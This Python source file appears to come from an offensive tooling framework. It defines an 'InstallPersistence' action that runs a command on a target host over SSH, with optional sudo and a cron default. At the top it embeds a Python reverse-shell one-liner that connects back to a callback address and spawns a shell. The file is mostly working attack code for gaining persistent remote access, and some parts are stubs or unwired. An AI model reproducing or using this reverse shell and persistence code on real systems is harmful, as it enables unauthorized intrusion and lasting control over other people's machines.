import logging
import multiprocessing

from diamondback.domain import Command
from diamondback.action import call_before_decorator,Action
from diamondback.connection.ssh import SSHClientWrapped

PYTHON_REVERSE_SHELL_2 = """python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{self.ip}",{self.port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'"""

class InstallPersistence( Action ):
    def __init__( self, *args, **kwargs ):
        super().__init__( self, *args, **kwargs )
        self.logger = logging.getLogger( 'install_persistence' )
        self.logger.info( 'initializing ExecuteCommand action' )

        i = self.get_input( )
        self.logger.info( f'using supplied target of {i}' )

        self.default_method_posix = "cron"

        self.implant_syntax = PYTHON_REVERSE_SHELL_2
        variables = self.variables | kwargs

        if "callback" in kwargs:
            self.callback = kwargs['callback']
            self.ip       = self.callback
        else:
            raise AttributeError('Missing a callback address!')

        if "port" in kwargs:
            self.port = int(kwargs["port"])
        else:
            self.port = 8843

        if 'command' in kwargs:
            self.original_command = kwargs['command']

            variables = self.variables | kwargs

        self.command = self.original_command.format( **variables )

    def execute_command( self ):
        """
        Execute commands on a remote host.
        
        Args:
            host: IP address of the host
            username: username
            password: password
        """


    @call_before_decorator
    def run( self ):
        self.logger.info(f"attempting to install persistence on target {self.get_input()}...")
        
        host = self.get_input()
        try:
            self.logger.info(f"[{host}] Successfully connected to target, executing: '{self.command}'")

            r = self.get_connection().execute( self.command, sudo=self.sudo )
            self.logger.info( f'execution completed--->{r}' )
            if 'out' in r:
                if r['out']:
                    self.logger.info(f"[{host}] Output:{r['out'][:512]}")  # Limit output length
                if r['err']:
                    self.logger.error(f"[{host}] Error: {r['err']}")
            else:
                self.logger.info( f"{r[:512]}" )  # Limit output length
        except Exception as e:
            self.logger.error(f"[{host}] Error: {str(e)}")

        self.logger.info("persistence installation execution completed on target")
        return self